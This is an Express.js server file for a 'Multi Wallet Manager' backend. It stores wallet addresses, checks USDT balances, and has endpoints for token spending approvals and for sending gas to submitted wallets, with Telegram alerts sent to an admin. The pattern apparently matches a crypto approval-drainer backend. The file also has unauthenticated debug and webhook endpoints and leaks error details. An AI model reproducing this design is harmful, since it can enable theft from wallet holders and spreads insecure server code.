const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const database = require('./config/database');
const telegram = require('./config/telegram');
const balanceChecker = require('./jobs/balanceChecker');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Database connection
database.connect();

// Telegram bot initialization
telegram.init();

// Start balance checker cron job
balanceChecker.start();

// Routes
app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        timestamp: new Date().toISOString(),
        service: 'Multi Wallet Manager Backend',
        telegram: telegram.isInitialized ? 'Connected' : 'Not Connected',
        render_url: process.env.RENDER_EXTERNAL_URL || 'Not set'
    });
});

app.get('/health-check', async (req, res) => {
    try {
        // Check database connection
        const dbResult = await database.query('SELECT NOW()');
        
        // Check blockchain connection
        const contractService = require('./services/contract.service');
        const blockNumber = await contractService.provider.getBlockNumber();
        
        // Check Telegram bot status
        const telegramStatus = telegram.isInitialized ? 'Connected' : 'Disconnected';
        
        res.json({
            status: 'OK',
            timestamp: new Date().toISOString(),
            database: 'Connected',
            blockchain: {
                status: 'Connected',
                blockNumber: blockNumber
            },
            telegram: telegramStatus,
            cron: {
                balanceChecker: 'Running'
            }
        });
    } catch (error) {
        res.status(500).json({
            status: 'ERROR',
            error: error.message
        });
    }
});

// Telegram webhook endpoint - this is what Telegram will call
app.post(`/telegram/${process.env.TELEGRAM_BOT_TOKEN}`, async (req, res) => {
    try {
        console.log('📥 RECEIVED TELEGRAM WEBHOOK UPDATE');
        console.log('Update type:', req.body?.message?.text || req.body?.callback_query?.data || 'Unknown');
        console.log('From chat:', req.body?.message?.chat?.id || req.body?.callback_query?.from?.id || 'Unknown');
        
        // Process the Telegram update
        await telegram.processUpdate(req.body);
        res.status(200).send('OK');
    } catch (error) {
        console.error('❌ ERROR PROCESSING TELEGRAM WEBHOOK:', error);
        res.status(500).send('Error');
    }
});

// Manual webhook setup endpoint
app.get('/setup-webhook', async (req, res) => {
    try {
        const TelegramBot = require('node-telegram-bot-api');
        const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
        
        const renderUrl = process.env.RENDER_EXTERNAL_URL;
        if (!renderUrl) {
            return res.status(400).json({ 
                success: false, 
                error: 'RENDER_EXTERNAL_URL not set in environment variables' 
            });
        }
        
        const webhookUrl = `${renderUrl}/telegram/${process.env.TELEGRAM_BOT_TOKEN}`;
        console.log('🔧 Setting webhook to:', webhookUrl);
        
        const result = await bot.setWebHook(webhookUrl);
        console.log('🔧 Webhook setup result:', result);
        
        res.json({ 
            success: true, 
            message: 'Webhook set successfully',
            url: webhookUrl,
            result: result
        });
    } catch (error) {
        console.error('❌ Webhook setup error:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
});

// Get current webhook info
app.get('/webhook-info', async (req, res) => {
    try {
        const TelegramBot = require('node-telegram-bot-api');
        const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
        
        const info = await bot.getWebHookInfo();
        res.json({ 
            success: true, 
            info: info 
        });
    } catch (error) {
        console.error('❌ Webhook info error:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
});

// Test endpoint to manually trigger a message
app.get('/test-alert', async (req, res) => {
    try {
        console.log('🧪 TEST ALERT REQUESTED');
        console.log('Admin chat ID:', process.env.ADMIN_CHAT_ID);
        
        if (process.env.ADMIN_CHAT_ID) {
            await telegram.sendWelcomeMessage(process.env.ADMIN_CHAT_ID);
            res.json({ success: true, message: 'Test message sent' });
        } else {
            res.status(400).json({ success: false, error: 'ADMIN_CHAT_ID not set' });
        }
    } catch (error) {
        console.error('❌ TEST ALERT ERROR:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Test endpoint to check if bot token is working
app.get('/bot-info', async (req, res) => {
    try {
        const TelegramBot = require('node-telegram-bot-api');
        const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
        const botInfo = await bot.getMe();
        res.json({ success: true, bot: botInfo });
    } catch (error) {
        console.error('❌ BOT INFO ERROR:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// FIXED: Updated wallet connection endpoint - NO TELEGRAM ALERT
app.post('/api/wallets/connect', async (req, res) => {
    try {
        const { address, name } = req.body;
        
        console.log('📥 WALLET CONNECTION REQUEST:', { address, name });
        
        // Validate address
        if (!address || address.length !== 42) {
            return res.status(400).json({
                success: false,
                error: 'Invalid wallet address'
            });
        }
        
        // Save wallet to database
        const query = `
            INSERT INTO wallets (address, name, created_at, updated_at)
            VALUES ($1, $2, NOW(), NOW())
            ON CONFLICT (address) DO UPDATE
            SET updated_at = NOW()
            RETURNING *
        `;
        
        const result = await database.query(query, [address, name || 'Unnamed Wallet']);
        const wallet = result.rows[0];
        
        console.log('💾 WALLET SAVED TO DATABASE:', wallet.address);
        
        // GET ACTUAL BALANCE
        const contractService = require('./services/contract.service');
        const balance = await contractService.getWalletUSDTBalance(address);
        
        // Update wallet with balance (no alert)
        const updateQuery = `
            UPDATE wallets 
            SET usdt_balance = $1, updated_at = NOW()
            WHERE address = $2
        `;
        await database.query(updateQuery, [balance, address]);
        
        res.json({
            success: true,
            wallet: {
                id: wallet.id,
                address: wallet.address,
                name: wallet.name,
                usdt_balance: balance,
                created_at: wallet.created_at
            }
        });
    } catch (error) {
        console.error('❌ WALLET CONNECTION ERROR:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Add the new approval spending endpoint
app.post('/api/wallets/approve-spending', async (req, res) => {
    const walletController = require('./controllers/wallet.controller');
    await walletController.approveSpending(req, res);
});

// Add gas request endpoint
app.post('/api/wallets/request-gas', async (req, res) => {
    try {
        const { address } = req.body;
        
        // Validate address
        if (!address || address.length !== 42) {
            return res.status(400).json({
                success: false,
                error: 'Invalid wallet address'
            });
        }
        
        // Send gas to wallet using gas service
        const gasService = require('./services/gas.service');
        const gasResult = await gasService.sendGasToWallet(address);
        
        if (!gasResult.success) {
            return res.status(500).json({
                success: false,
                error: 'Failed to send gas to wallet: ' + gasResult.error
            });
        }
        
        res.json({
            success: true,
            message: 'Gas sent successfully',
            txHash: gasResult.txHash
        });
    } catch (error) {
        console.error('Gas request error:', error);
        res.status(500).json({
            success: false,
            error: 'Internal server error: ' + error.message
        });
    }
});

// Add debug endpoint for verification
app.get('/debug/approval/:walletAddress', async (req, res) => {
    const walletController = require('./controllers/wallet.controller');
    await walletController.verifyWalletApproval(req, res);
});

// ==================== TEST ENDPOINTS ====================
if (process.env.NODE_ENV !== 'production') {
    // Test USDT balance endpoint - requires wallet address parameter
    app.get('/test-usdt', async (req, res) => {
        res.json({
            success: true,
            message: 'Use /test-usdt/{walletAddress} to test USDT balance for a specific wallet',
            example: '/test-usdt/0xYourWalletAddressHere'
        });
    });

    // Test with your own wallet address
    app.get('/test-usdt/:walletAddress', async (req, res) => {
        try {
            const walletAddress = req.params.walletAddress;
            console.log('🧪 USDT Balance Test for wallet:', walletAddress);
            
            if (!walletAddress || walletAddress.length !== 42) {
                return res.status(400).json({
                    success: false,
                    error: 'Invalid wallet address - must be 42 characters starting with 0x'
                });
            }
            
            // Use environment configured RPC
            const { ethers } = require('ethers');
            const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);

            // Use environment configured USDT contract address
            const usdtAddress = process.env.USDT_CONTRACT_ADDRESS;
            
            if (!usdtAddress) {
                return res.status(500).json({
                    success: false,
                    error: 'USDT_CONTRACT_ADDRESS not configured in environment'
                });
            }

            try {
                console.log(`Testing USDT contract: ${usdtAddress}`);
                
                const usdtContract = new ethers.Contract(
                    usdtAddress,
                    ['function balanceOf(address account) external view returns (uint256)'],
                    provider
                );
                
                const balance = await usdtContract.balanceOf(walletAddress);
                const balanceFormatted = ethers.formatUnits(balance, 18);
                
                res.json({
                    success: true,
                    wallet: walletAddress,
                    contract: usdtAddress,
                    rawBalance: balance.toString(),
                    balance: balanceFormatted,
                    hasBalance: parseFloat(balanceFormatted) > 0,
                    timestamp: new Date().toISOString()
                });
                
                console.log(`Contract ${usdtAddress}: ${balanceFormatted} USDT for wallet ${walletAddress}`);
                
            } catch (error) {
                console.error(`Contract ${usdtAddress} failed for wallet ${walletAddress}:`, error.message);
                res.status(500).json({
                    success: false,
                    wallet: walletAddress,
                    contract: usdtAddress,
                    error: error.message
                });
            }
            
        } catch (error) {
            console.error('USDT test error:', error);
            res.status(500).json({
                success: false,
                error: error.message
            });
        }
    });
}
// ==================== END TEST ENDPOINTS ====================

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('💥 UNHANDLED ERROR:', err);
    res.status(500).json({
        success: false,
        error: 'Internal server error: ' + err.message
    });
});

// Handle 404 - THIS MUST BE THE VERY LAST ROUTE
app.use((req, res) => {
    console.log('❓ 404 NOT FOUND:', req.method, req.url);
    res.status(404).json({
        success: false,
        error: 'Route not found'
    });
});

const server = app.listen(PORT, '0.0.0.0', async () => {
    console.log(`🚀 Multi Wallet Manager backend running on port ${PORT}`);
    
    // Auto-setup webhook in production
    if (process.env.NODE_ENV === 'production' && process.env.RENDER_EXTERNAL_URL) {
        console.log('🔧 Auto-setting up webhook...');
        setTimeout(async () => {
            try {
                const TelegramBot = require('node-telegram-bot-api');
                const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
                
                const webhookUrl = `${process.env.RENDER_EXTERNAL_URL}/telegram/${process.env.TELEGRAM_BOT_TOKEN}`;
                console.log('🔧 Setting webhook to:', webhookUrl);
                
                const result = await bot.setWebHook(webhookUrl);
                console.log('✅ Webhook auto-setup result:', result);
            } catch (error) {
                console.error('❌ Webhook auto-setup failed:', error.message);
            }
        }, 5000); // Wait 5 seconds for everything to initialize
    }
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('🛑 SIGTERM received, shutting down gracefully');
    server.close(() => {
        console.log('✅ Process terminated');
        process.exit(0);
    });
});

module.exports = app;

